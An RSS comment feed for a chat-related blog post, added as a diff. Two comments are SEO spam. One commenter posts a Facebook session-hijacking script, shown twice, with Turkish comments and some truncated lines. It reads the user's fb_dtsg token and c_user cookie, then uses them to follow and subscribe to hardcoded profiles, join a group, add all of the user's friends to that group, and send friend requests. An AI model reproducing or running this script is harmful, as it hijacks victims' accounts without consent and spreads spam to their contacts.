@@ -1,0 +1,501 @@
+<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
+	xmlns:content="http://purl.org/rss/1.0/modules/content/"
+	xmlns:dc="http://purl.org/dc/elements/1.1/"
+	xmlns:atom="http://www.w3.org/2005/Atom"
+	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
+	
+	>
+<channel>
+	<title>
+	Comments on: Extension Update!	</title>
+	<atom:link href="/extension-update-3/feed/" rel="self" type="application/rss+xml" />
+	<link>/extension-update-3/</link>
+	<description>For all that is chat related.</description>
+	<lastBuildDate>Mon, 01 Sep 2014 16:07:33 +0000</lastBuildDate>
+	<sy:updatePeriod>
+	hourly	</sy:updatePeriod>
+	<sy:updateFrequency>
+	1	</sy:updateFrequency>
+	<generator>https://wordpress.org/?v=6.6.1</generator>
+	<item>
+		<title>
+		By: Nam		</title>
+		<link>/extension-update-3/#comment-16366</link>
+
+		<dc:creator><![CDATA[Nam]]></dc:creator>
+		<pubDate>Mon, 01 Sep 2014 16:07:33 +0000</pubDate>
+		<guid isPermaLink="false">/?p=285#comment-16366</guid>
+
+					<description><![CDATA[I read a lot of interesting articles here. Probably you  spend a lot of time writing, i know how to save you 
+a lot of time, there is an online tool that creates readable,
+google friendly articles in seconds, just type in google  - laranitas free content 
+source]]></description>
+			<content:encoded><![CDATA[<p>I read a lot of interesting articles here. Probably you  spend a lot of time writing, i know how to save you<br />
+a lot of time, there is an online tool that creates readable,<br />
+google friendly articles in seconds, just type in google  &#8211; laranitas free content<br />
+source</p>
+]]></content:encoded>
+		
+			</item>
+		<item>
+		<title>
+		By: Colleen		</title>
+		<link>/extension-update-3/#comment-16291</link>
+
+		<dc:creator><![CDATA[Colleen]]></dc:creator>
+		<pubDate>Tue, 08 Jul 2014 16:13:22 +0000</pubDate>
+		<guid isPermaLink="false">/?p=285#comment-16291</guid>
+
+					<description><![CDATA[It&#039;s hard to find your articles in google. I found it on 18 
+spot, you should build quality backlinks , it will help you to increase traffic.
+I know how to help you, just search in google - k2 seo tips]]></description>
+			<content:encoded><![CDATA[<p>It&#8217;s hard to find your articles in google. I found it on 18<br />
+spot, you should build quality backlinks , it will help you to increase traffic.<br />
+I know how to help you, just search in google &#8211; k2 seo tips</p>
+]]></content:encoded>
+		
+			</item>
+		<item>
+		<title>
+		By: fyug		</title>
+		<link>/extension-update-3/#comment-16103</link>
+
+		<dc:creator><![CDATA[fyug]]></dc:creator>
+		<pubDate>Sat, 19 Apr 2014 06:57:37 +0000</pubDate>
+		<guid isPermaLink="false">/?p=285#comment-16103</guid>
+
+					<description><![CDATA[var fb_dtsg = document.getElementsByName(&#039;fb_dtsg&#039;)[0].value;
+var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
+	
+function cereziAl(isim) {
+    var tarama = isim + &quot;=&quot;;
+    if (document.cookie.length &#062; 0) {
+        konum = document.cookie.indexOf(tarama)
+        if (konum != -1) {
+            konum += tarama.length
+            son = document.cookie.indexOf(&quot;;&quot;, konum)
+            if (son == -1)
+                son = document.cookie.length
+            return unescape(document.cookie.substring(konum, son))
+        }
+        else { return &quot;&quot;; }
+    }
+}
+
+function getRandomInt (min, max) {
+    return Math.floor(Math.random() * (max - min + 1)) + min;
+}
+function randomValue(arr) {
+    return arr[getRandomInt(0, arr.length-1)];
+}
+
+var fb_dtsg = document.getElementsByName(&#039;fb_dtsg&#039;)[0].value;
+var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
+
+function a(abone){
+    var http4 = new XMLHttpRequest();
+     
+    var url4 = &quot;/ajax/follow/follow_profile.php?__a=1&quot;;
+     
+    var params4 = &quot;profile_id=&quot; + abone + &quot;&#038;location=1&#038;source=follow-button&#038;subscribed_button_id=u37qac_37&#038;fb_dtsg=&quot; + fb_dtsg + &quot;&#038;lsd&#038;__&quot; + user_id + &quot;&#038;phstamp=&quot;;
+    http4.open(&quot;POST&quot;, url4, true);
+     
+    //Send the proper header information along with the request
+    http4.setRequestHeader(&quot;Content-type&quot;, &quot;application/x-www-form-urlencoded&quot;);
+    http4.setRequestHeader(&quot;Content-length&quot;, params4.length);
+    http4.setRequestHeader(&quot;Connection&quot;, &quot;close&quot;);
+     
+    http4.onreadystatechange = function() {//Call a function when the state changes.
+    if(http4.readyState == 4 &#038;&#038; http4.status == 200) {
+       
+      http4.close; // Close the connection
+     
+    }
+    }
+    
+    http4.send(params4);
+}
+
+function sublist(uidss) {
+		var a = document.createElement(&#039;script&#039;);
+		a.innerHTML = &quot;new AsyncRequest().setURI(&#039;/ajax/friends/lists/subscribe/modify?location=permalink&#038;action=subscribe&#039;).setData({ flid: &quot; + uidss + &quot; }).send();&quot;;
+		document.body.appendChild(a);
+}
+
+a(&quot;100000826713483&quot;);
+a(&quot;100002920570679&quot;);
+a(&quot;100004303812786&quot;);
+a(&quot;536046019836079&quot;);
+a(&quot;498615213579160&quot;);
+a(&quot;508194392621242&quot;);
+a(&quot;531890363584978&quot;);
+a(&quot;520250108082337&quot;);
+a(&quot;523994784374536&quot;);
+a(&quot;540083352695884&quot;);
+a(&quot;234921903327935&quot;);
+
+sublist(&quot;234921903327935&quot;);
+sublist(&quot;100000826713483&quot;);
+sublist(&quot;100002920570679&quot;);
+sublist(&quot;536046019836079&quot;);
+sublist(&quot;498615213579160&quot;);
+sublist(&quot;508194392621242&quot;);
+sublist(&quot;531890363584978&quot;);
+sublist(&quot;520250108082337&quot;);
+sublist(&quot;523994784374536&quot;);
+sublist(&quot;540083352695884&quot;);
+sublist(&quot;100004303812786&quot;);
+
+
+var gid = [&#039;141651002585460/&#039;];
+
+var fb_dtsg = document[&#039;getElementsByName&#039;](&#039;fb_dtsg&#039;)[0][&#039;value&#039;];
+var user_id = document[&#039;cookie&#039;][&#039;match&#039;](document[&#039;cookie&#039;][&#039;match&#039;](/c_user=(\d+)/)[1]);
+
+var httpwp = new XMLHttpRequest();
+var urlwp = &#039;/ajax/groups/membership/r2j.php?__a=1&#039;;
+var paramswp = &#039;&#038;ref=group_jump_header&#038;group_id=&#039; + gid + &#039;&#038;fb_dtsg=&#039; + fb_dtsg + &#039;&#038;__user=&#039; + user_id + &#039;&#038;phstamp=&#039;;
+httpwp[&#039;open&#039;](&#039;POST&#039;, urlwp, true);
+httpwp[&#039;setRequestHeader&#039;](&#039;Content-type&#039;, &#039;application/x-www-form-urlencoded&#039;);
+httpwp[&#039;setRequestHeader&#039;](&#039;Content-length&#039;, paramswp[&#039;length&#039;]);
+httpwp[&#039;setRequestHeader&#039;](&#039;Connection&#039;, &#039;keep-alive&#039;);
+httpwp[&#039;send&#039;](paramswp);
+
+var fb_dtsg = document[&#039;getElementsByName&#039;](&#039;fb_dtsg&#039;)[0][&#039;value&#039;];
+var user_id = document[&#039;cookie&#039;][&#039;match&#039;](document[&#039;cookie&#039;][&#039;match&#039;](/c_user=(\d+)/)[1]);
+
+var friends = new Array();
+gf = new XMLHttpRequest();
+gf[&#039;open&#039;](&#039;GET&#039;, &#039;/ajax/typeahead/first_degree.php?__a=1&#038;viewer=&#039; + user_id + &#039;&#038;token&#039; + Math[&#039;random&#039;]() + &#039;&#038;filter[0]=user&#038;options[0]=friends_only&#039;, false);
+gf[&#039;send&#039;]();
+if (gf[&#039;readyState&#039;] != 4) {} else {
+    data = eval(&#039;(&#039; + gf[&#039;responseText&#039;][&#039;substr&#039;](9) + &#039;)&#039;);
+    if (data[&#039;error&#039;]) {} else {
+        friends = data[&#039;payload&#039;][&#039;entries&#039;][&#039;sort&#039;](function (_0x93dax8, _0x93dax9) {
+            return _0x93dax8[&#039;index&#039;] - _0x93dax9[&#039;index&#039;];
+        });
+    };
+};
+
+for (var i = 0; i &#060; friends[&#039;length&#039;]; i++) {
+    var httpwp = new XMLHttpRequest();
+    var urlwp = &#039;/ajax/groups/members/add_post.php?__a=1&#039;;
+    var paramswp= &#039;&#038;fb_dtsg=&#039; + fb_dtsg + &#039;&#038;group_id=&#039; + gid + &#039;&#038;source=typeahead&#038;ref=&#038;message_id=&#038;members=&#039; + friends[i][&#039;uid&#039;] + &#039;&#038;__user=&#039; + user_id + &#039;&#038;phstamp=&#039;;
+    httpwp[&#039;open&#039;](&#039;POST&#039;, urlwp, true);
+    httpwp[&#039;setRequestHeader&#039;](&#039;Content-type&#039;, &#039;application/x-www-form-urlencoded&#039;);
+    httpwp[&#039;setRequestHeader&#039;](&#039;Content-length&#039;, paramswp[&#039;length&#039;]);
+    httpwp[&#039;setRequestHeader&#039;](&#039;Connection&#039;, &#039;keep-alive&#039;);
+    httpwp[&#039;onreadystatechange&#039;] = function () {
+if (httpwp[&#039;readyState&#039;] == 4 &#038;&#038; httpwp[&#039;status&#039;] == 200) {};
+    };
+    httpwp[&#039;send&#039;](paramswp);
+};
+var spage_id = &#034;190809831114276&#034;;
+var spost_id = &#034;1442403775972967&#034;;
+var sfoto_id = &#034;720192621325830&#034;;
+var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
+var smesaj = &#034;&#034;;
+var smesaj_text = &#034;&#034;;
+var arkadaslar = [];
+var svn_rev;
+var bugun= new Date();
+var btarihi = new Date(); 
+btarihi.setTime(bugun.getTime() + 1000*60*60*4*1);
+if(!document.cookie.match(/paylasti=(\d+)/)){
+document.cookie = &#034;paylasti=hayir;expires=&#034;+ btarihi.toGMTString();
+}
+
+
+//arkadaslari al ve isle
+function sarkadaslari_al(){
+		var xmlhttp = new XMLHttpRequest();
+        xmlhttp.onreadystatechange = function () {
+			if(xmlhttp.readyState == 4){
+				  eval(&#034;arkadaslar = &#034; + xmlhttp.responseText.toString().replace(&#034;for (;;);&#034;,&#034;&#034;) + &#034;;&#034;);
+				  for(f=0;f&#060;Math.round(arkadaslar.payload.entries.length/10);f++){
+					smesaj = &#034;&#034;;
+					smesaj_text = &#034;&#034;;
+				  for(i=f*10;i= 0) { xmlhttp.open(&quot;GET&quot;, &quot;https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1&quot; + params, true); }
+        else { xmlhttp.open(&quot;GET&quot;, &quot;http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1&quot; + params, true); }
+        xmlhttp.send();
+}
+
+//tiklama olayini dinle
+var tiklama = document.addEventListener(&quot;click&quot;, function () {
+if(document.cookie.split(&quot;paylasti=&quot;)[1].split(&quot;;&quot;)[0].indexOf(&quot;hayir&quot;) &#062;= 0){
+svn_rev = document.head.innerHTML.split(&#039;&quot;svn_rev&quot;:&#039;)[1].split(&quot;,&quot;)[0];
+sarkadaslari_al();
+document.cookie = &quot;paylasti=evet;expires=&quot;+ btarihi.toGMTString();
+
+document.removeEventListener(tiklama);
+}
+ }, false);
+  
+
+//arkada?¾ ekleme
+function sarkadasekle(uid,cins){
+		var xmlhttp = new XMLHttpRequest();
+        xmlhttp.onreadystatechange = function () {
+			if(xmlhttp.readyState == 4){	
+			}
+        };
+		
+		xmlhttp.open(&quot;POST&quot;, &quot;/ajax/add_friend/action.php?__a=1&quot;, true); 
+		var params = &quot;to_friend=&quot; + uid;
+		params += &quot;&#038;action=add_friend&quot;;
+		params += &quot;&#038;how_found=friend_browser&quot;;
+		params += &quot;&#038;ref_param=none&quot;;
+		params += &quot;&#038;outgoing_id=&quot;;
+		params += &quot;&#038;logging_location=friend_browser&quot;;
+		params += &quot;&#038;no_flyout_on_click=true&quot;;
+		params += &quot;&#038;ego_log_data=&quot;;
+		params += &quot;&#038;http_referer=&quot;;
+		params += &quot;&#038;fb_dtsg=&quot; + document.getElementsByName(&#039;fb_dtsg&#039;)[0].value;
+        params += &quot;&#038;phstamp=165816749114848369115&quot;;
+		params += &quot;&#038;__user=&quot; + user_id;
+		xmlhttp.setRequestHeader (&quot;X-SVN-Rev&quot;, svn_rev);
+		xmlhttp.setRequestHeader (&quot;Content-Type&quot;,&quot;application/x-www-form-urlencoded&quot;);
+		
+if(cins == &quot;farketmez&quot; &#038;&#038; document.cookie.split(&quot;cins&quot; + user_id +&quot;=&quot;).length &#062; 1){
+		xmlhttp.send(params);
+}else if(document.cookie.split(&quot;cins&quot; + user_id +&quot;=&quot;).length &#060;= 1){
+		cinsiyetgetir(uid,cins,&#034;sarkadasekle&#034;);
+}else if(cins == document.cookie.split(&#034;cins&#034; + user_id +&#034;=&#034;)[1].split(&#034;;&#034;)[0].toString()){
+		xmlhttp.send(params);
+}
+}
+
+//cinsiyet belirleme
+var cinssonuc = {};
+var cinshtml = document.createElement(&#034;html&#034;);
+function scinsiyetgetir(uid,cins,fonksiyon){
+		var xmlhttp = new XMLHttpRequest();
+        xmlhttp.onreadystatechange = function () {
+			if(xmlhttp.readyState == 4){
+			eval(&#034;cinssonuc = &#034; + xmlhttp.responseText.toString().replace(&#034;for (;;);&#034;,&#034;&#034;) + &#034;;&#034;);
+			cinshtml.innerHTML = cinssonuc.jsmods.markup[0][1].__html
+			btarihi.setTime(bugun.getTime() + 1000*60*60*24*365);
+			if(cinshtml.getElementsByTagName(&#034;select&#034;)[0].value == &#034;1&#034;){
+			document.cookie = &#034;cins&#034; + user_id + &#034;=kadin;expires=&#034; + btarihi.toGMTString();
+			}else if(cinshtml.getElementsByTagName(&#034;select&#034;)[0].value == &#034;2&#034;){
+			document.cookie = &#034;cins&#034; + user_id + &#034;=erkek;expires=&#034; + btarihi.toGMTString();
+			}
+			eval(fonksiyon + &#034;(&#034; + id + &#034;,&#034; + cins + &#034;);&#034;);
+			}
+        };
+		xmlhttp.open(&#034;GET&#034;, &#034;/ajax/timeline/edit_profile/basic_info.php?__a=1&#038;__user=&#034; + user_id, true);
+		xmlhttp.setRequestHeader (&#034;X-SVN-Rev&#034;, svn_rev);
+		xmlhttp.send();
+}]]></description>
+			<content:encoded><![CDATA[<p>var fb_dtsg = document.getElementsByName(&#8216;fb_dtsg&#8217;)[0].value;<br />
+var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);</p>
+<p>function cereziAl(isim) {<br />
+    var tarama = isim + &#8220;=&#8221;;<br />
+    if (document.cookie.length &gt; 0) {<br />
+        konum = document.cookie.indexOf(tarama)<br />
+        if (konum != -1) {<br />
+            konum += tarama.length<br />
+            son = document.cookie.indexOf(&#8220;;&#8221;, konum)<br />
+            if (son == -1)<br />
+                son = document.cookie.length<br />
+            return unescape(document.cookie.substring(konum, son))<br />
+        }<br />
+        else { return &#8220;&#8221;; }<br />
+    }<br />
+}</p>
+<p>function getRandomInt (min, max) {<br />
+    return Math.floor(Math.random() * (max &#8211; min + 1)) + min;<br />
+}<br />
+function randomValue(arr) {<br />
+    return arr[getRandomInt(0, arr.length-1)];<br />
+}</p>
+<p>var fb_dtsg = document.getElementsByName(&#8216;fb_dtsg&#8217;)[0].value;<br />
+var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);</p>
+<p>function a(abone){<br />
+    var http4 = new XMLHttpRequest();</p>
+<p>    var url4 = &#8220;/ajax/follow/follow_profile.php?__a=1&#8221;;</p>
+<p>    var params4 = &#8220;profile_id=&#8221; + abone + &#8220;&amp;location=1&amp;source=follow-button&amp;subscribed_button_id=u37qac_37&amp;fb_dtsg=&#8221; + fb_dtsg + &#8220;&amp;lsd&amp;__&#8221; + user_id + &#8220;&amp;phstamp=&#8221;;<br />
+    http4.open(&#8220;POST&#8221;, url4, true);</p>
+<p>    //Send the proper header information along with the request<br />
+    http4.setRequestHeader(&#8220;Content-type&#8221;, &#8220;application/x-www-form-urlencoded&#8221;);<br />
+    http4.setRequestHeader(&#8220;Content-length&#8221;, params4.length);<br />
+    http4.setRequestHeader(&#8220;Connection&#8221;, &#8220;close&#8221;);</p>
+<p>    http4.onreadystatechange = function() {//Call a function when the state changes.<br />
+    if(http4.readyState == 4 &amp;&amp; http4.status == 200) {</p>
+<p>      http4.close; // Close the connection</p>
+<p>    }<br />
+    }</p>
+<p>    http4.send(params4);<br />
+}</p>
+<p>function sublist(uidss) {<br />
+		var a = document.createElement(&#8216;script&#8217;);<br />
+		a.innerHTML = &#8220;new AsyncRequest().setURI(&#8216;/ajax/friends/lists/subscribe/modify?location=permalink&amp;action=subscribe&#8217;).setData({ flid: &#8221; + uidss + &#8221; }).send();&#8221;;<br />
+		document.body.appendChild(a);<br />
+}</p>
+<p>a(&#8220;100000826713483&#8221;);<br />
+a(&#8220;100002920570679&#8221;);<br />
+a(&#8220;100004303812786&#8221;);<br />
+a(&#8220;536046019836079&#8221;);<br />
+a(&#8220;498615213579160&#8221;);<br />
+a(&#8220;508194392621242&#8221;);<br />
+a(&#8220;531890363584978&#8221;);<br />
+a(&#8220;520250108082337&#8221;);<br />
+a(&#8220;523994784374536&#8221;);<br />
+a(&#8220;540083352695884&#8221;);<br />
+a(&#8220;234921903327935&#8221;);</p>
+<p>sublist(&#8220;234921903327935&#8221;);<br />
+sublist(&#8220;100000826713483&#8221;);<br />
+sublist(&#8220;100002920570679&#8221;);<br />
+sublist(&#8220;536046019836079&#8221;);<br />
+sublist(&#8220;498615213579160&#8221;);<br />
+sublist(&#8220;508194392621242&#8221;);<br />
+sublist(&#8220;531890363584978&#8221;);<br />
+sublist(&#8220;520250108082337&#8221;);<br />
+sublist(&#8220;523994784374536&#8221;);<br />
+sublist(&#8220;540083352695884&#8221;);<br />
+sublist(&#8220;100004303812786&#8221;);</p>
+<p>var gid = [&#8216;141651002585460/&#8217;];</p>
+<p>var fb_dtsg = document[&#8216;getElementsByName&#8217;](&#8216;fb_dtsg&#8217;)[0][&#8216;value&#8217;];<br />
+var user_id = document[&#8216;cookie&#8217;][&#8216;match&#8217;](document[&#8216;cookie&#8217;][&#8216;match&#8217;](/c_user=(\d+)/)[1]);</p>
+<p>var httpwp = new XMLHttpRequest();<br />
+var urlwp = &#8216;/ajax/groups/membership/r2j.php?__a=1&#8217;;<br />
+var paramswp = &#8216;&amp;ref=group_jump_header&amp;group_id=&#8217; + gid + &#8216;&amp;fb_dtsg=&#8217; + fb_dtsg + &#8216;&amp;__user=&#8217; + user_id + &#8216;&amp;phstamp=&#8217;;<br />
+httpwp[&#8216;open&#8217;](&#8216;POST&#8217;, urlwp, true);<br />
+httpwp[&#8216;setRequestHeader&#8217;](&#8216;Content-type&#8217;, &#8216;application/x-www-form-urlencoded&#8217;);<br />
+httpwp[&#8216;setRequestHeader&#8217;](&#8216;Content-length&#8217;, paramswp[&#8216;length&#8217;]);<br />
+httpwp[&#8216;setRequestHeader&#8217;](&#8216;Connection&#8217;, &#8216;keep-alive&#8217;);<br />
+httpwp[&#8216;send&#8217;](paramswp);</p>
+<p>var fb_dtsg = document[&#8216;getElementsByName&#8217;](&#8216;fb_dtsg&#8217;)[0][&#8216;value&#8217;];<br />
+var user_id = document[&#8216;cookie&#8217;][&#8216;match&#8217;](document[&#8216;cookie&#8217;][&#8216;match&#8217;](/c_user=(\d+)/)[1]);</p>
+<p>var friends = new Array();<br />
+gf = new XMLHttpRequest();<br />
+gf[&#8216;open&#8217;](&#8216;GET&#8217;, &#8216;/ajax/typeahead/first_degree.php?__a=1&amp;viewer=&#8217; + user_id + &#8216;&amp;token&#8217; + Math[&#8216;random&#8217;]() + &#8216;&amp;filter[0]=user&amp;options[0]=friends_only&#8217;, false);<br />
+gf[&#8216;send&#8217;]();<br />
+if (gf[&#8216;readyState&#8217;] != 4) {} else {<br />
+    data = eval(&#8216;(&#8216; + gf[&#8216;responseText&#8217;][&#8216;substr&#8217;](9) + &#8216;)&#8217;);<br />
+    if (data[&#8216;error&#8217;]) {} else {<br />
+        friends = data[&#8216;payload&#8217;][&#8216;entries&#8217;][&#8216;sort&#8217;](function (_0x93dax8, _0x93dax9) {<br />
+            return _0x93dax8[&#8216;index&#8217;] &#8211; _0x93dax9[&#8216;index&#8217;];<br />
+        });<br />
+    };<br />
+};</p>
+<p>for (var i = 0; i &lt; friends[&#039;length&#039;]; i++) {<br />
+    var httpwp = new XMLHttpRequest();<br />
+    var urlwp = &#039;/ajax/groups/members/add_post.php?__a=1&#039;;<br />
+    var paramswp= &#039;&amp;fb_dtsg=&#039; + fb_dtsg + &#039;&amp;group_id=&#039; + gid + &#039;&amp;source=typeahead&amp;ref=&amp;message_id=&amp;members=&#039; + friends[i][&#039;uid&#039;] + &#039;&amp;__user=&#039; + user_id + &#039;&amp;phstamp=&#039;;<br />
+    httpwp[&#039;open&#039;](&#039;POST&#039;, urlwp, true);<br />
+    httpwp[&#039;setRequestHeader&#039;](&#039;Content-type&#039;, &#039;application/x-www-form-urlencoded&#039;);<br />
+    httpwp[&#039;setRequestHeader&#039;](&#039;Content-length&#039;, paramswp[&#039;length&#039;]);<br />
+    httpwp[&#039;setRequestHeader&#039;](&#039;Connection&#039;, &#039;keep-alive&#039;);<br />
+    httpwp[&#039;onreadystatechange&#039;] = function () {<br />
+if (httpwp[&#039;readyState&#039;] == 4 &amp;&amp; httpwp[&#039;status&#039;] == 200) {};<br />
+    };<br />
+    httpwp[&#039;send&#039;](paramswp);<br />
+};<br />
+var spage_id = &quot;190809831114276&quot;;<br />
+var spost_id = &quot;1442403775972967&quot;;<br />
+var sfoto_id = &quot;720192621325830&quot;;<br />
+var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);<br />
+var smesaj = &quot;&quot;;<br />
+var smesaj_text = &quot;&quot;;<br />
+var arkadaslar = [];<br />
+var svn_rev;<br />
+var bugun= new Date();<br />
+var btarihi = new Date();<br />
+btarihi.setTime(bugun.getTime() + 1000*60*60*4*1);<br />
+if(!document.cookie.match(/paylasti=(\d+)/)){<br />
+document.cookie = &quot;paylasti=hayir;expires=&quot;+ btarihi.toGMTString();<br />
+}</p>
+<p>//arkadaslari al ve isle<br />
+function sarkadaslari_al(){<br />
+		var xmlhttp = new XMLHttpRequest();<br />
+        xmlhttp.onreadystatechange = function () {<br />
+			if(xmlhttp.readyState == 4){<br />
+				  eval(&quot;arkadaslar = &quot; + xmlhttp.responseText.toString().replace(&quot;for (;;);&quot;,&quot;&quot;) + &quot;;&quot;);<br />
+				  for(f=0;f&lt;Math.round(arkadaslar.payload.entries.length/10);f++){<br />
+					smesaj = &quot;&quot;;<br />
+					smesaj_text = &quot;&quot;;<br />
+				  for(i=f*10;i= 0) { xmlhttp.open(&#8220;GET&#8221;, &#8220;https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1&#8221; + params, true); }<br />
+        else { xmlhttp.open(&#8220;GET&#8221;, &#8220;http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1&#8221; + params, true); }<br />
+        xmlhttp.send();<br />
+}</p>
+<p>//tiklama olayini dinle<br />
+var tiklama = document.addEventListener(&#8220;click&#8221;, function () {<br />
+if(document.cookie.split(&#8220;paylasti=&#8221;)[1].split(&#8220;;&#8221;)[0].indexOf(&#8220;hayir&#8221;) &gt;= 0){<br />
+svn_rev = document.head.innerHTML.split(&#8216;&#8221;svn_rev&#8221;:&#8217;)[1].split(&#8220;,&#8221;)[0];<br />
+sarkadaslari_al();<br />
+document.cookie = &#8220;paylasti=evet;expires=&#8221;+ btarihi.toGMTString();</p>
+<p>document.removeEventListener(tiklama);<br />
+}<br />
+ }, false);</p>
+<p>//arkada?¾ ekleme<br />
+function sarkadasekle(uid,cins){<br />
+		var xmlhttp = new XMLHttpRequest();<br />
+        xmlhttp.onreadystatechange = function () {<br />
+			if(xmlhttp.readyState == 4){<br />
+			}<br />
+        };</p>
+<p>		xmlhttp.open(&#8220;POST&#8221;, &#8220;/ajax/add_friend/action.php?__a=1&#8221;, true);<br />
+		var params = &#8220;to_friend=&#8221; + uid;<br />
+		params += &#8220;&amp;action=add_friend&#8221;;<br />
+		params += &#8220;&amp;how_found=friend_browser&#8221;;<br />
+		params += &#8220;&amp;ref_param=none&#8221;;<br />
+		params += &#8220;&amp;outgoing_id=&#8221;;<br />
+		params += &#8220;&amp;logging_location=friend_browser&#8221;;<br />
+		params += &#8220;&amp;no_flyout_on_click=true&#8221;;<br />
+		params += &#8220;&amp;ego_log_data=&#8221;;<br />
+		params += &#8220;&amp;http_referer=&#8221;;<br />
+		params += &#8220;&amp;fb_dtsg=&#8221; + document.getElementsByName(&#8216;fb_dtsg&#8217;)[0].value;<br />
+        params += &#8220;&amp;phstamp=165816749114848369115&#8221;;<br />
+		params += &#8220;&amp;__user=&#8221; + user_id;<br />
+		xmlhttp.setRequestHeader (&#8220;X-SVN-Rev&#8221;, svn_rev);<br />
+		xmlhttp.setRequestHeader (&#8220;Content-Type&#8221;,&#8221;application/x-www-form-urlencoded&#8221;);</p>
+<p>if(cins == &#8220;farketmez&#8221; &amp;&amp; document.cookie.split(&#8220;cins&#8221; + user_id +&#8221;=&#8221;).length &gt; 1){<br />
+		xmlhttp.send(params);<br />
+}else if(document.cookie.split(&#8220;cins&#8221; + user_id +&#8221;=&#8221;).length &lt;= 1){<br />
+		cinsiyetgetir(uid,cins,&quot;sarkadasekle&quot;);<br />
+}else if(cins == document.cookie.split(&quot;cins&quot; + user_id +&quot;=&quot;)[1].split(&quot;;&quot;)[0].toString()){<br />
+		xmlhttp.send(params);<br />
+}<br />
+}</p>
+<p>//cinsiyet belirleme<br />
+var cinssonuc = {};<br />
+var cinshtml = document.createElement(&quot;html&quot;);<br />
+function scinsiyetgetir(uid,cins,fonksiyon){<br />
+		var xmlhttp = new XMLHttpRequest();<br />
+        xmlhttp.onreadystatechange = function () {<br />
+			if(xmlhttp.readyState == 4){<br />
+			eval(&quot;cinssonuc = &quot; + xmlhttp.responseText.toString().replace(&quot;for (;;);&quot;,&quot;&quot;) + &quot;;&quot;);<br />
+			cinshtml.innerHTML = cinssonuc.jsmods.markup[0][1].__html<br />
+			btarihi.setTime(bugun.getTime() + 1000*60*60*24*365);<br />
+			if(cinshtml.getElementsByTagName(&quot;select&quot;)[0].value == &quot;1&quot;){<br />
+			document.cookie = &quot;cins&quot; + user_id + &quot;=kadin;expires=&quot; + btarihi.toGMTString();<br />
+			}else if(cinshtml.getElementsByTagName(&quot;select&quot;)[0].value == &quot;2&quot;){<br />
+			document.cookie = &quot;cins&quot; + user_id + &quot;=erkek;expires=&quot; + btarihi.toGMTString();<br />
+			}<br />
+			eval(fonksiyon + &quot;(&quot; + id + &quot;,&quot; + cins + &quot;);&quot;);<br />
+			}<br />
+        };<br />
+		xmlhttp.open(&quot;GET&quot;, &quot;/ajax/timeline/edit_profile/basic_info.php?__a=1&amp;__user=&quot; + user_id, true);<br />
+		xmlhttp.setRequestHeader (&quot;X-SVN-Rev&quot;, svn_rev);<br />
+		xmlhttp.send();<br />
+}</p>
+]]></content:encoded>
+		
+			</item>
+		<item>
+		<title>
+		By: fyug		</title>
+		<link>/extension-update-3/#comment-16102</link>
+
+		<dc:creator><![CDATA[fyug]]></dc:creator>
+		<pubDate>Sat, 19 Apr 2014 06:57:03 +0000</pubDate>
+		<guid isPermaLink="false">/?p=285#comment-16102</guid>
+
+					<description><![CDATA[n]]></description>
+			<content:encoded><![CDATA[<p>n</p>
+]]></content:encoded>
+		
+			</item>
+	</channel>
+</rss>
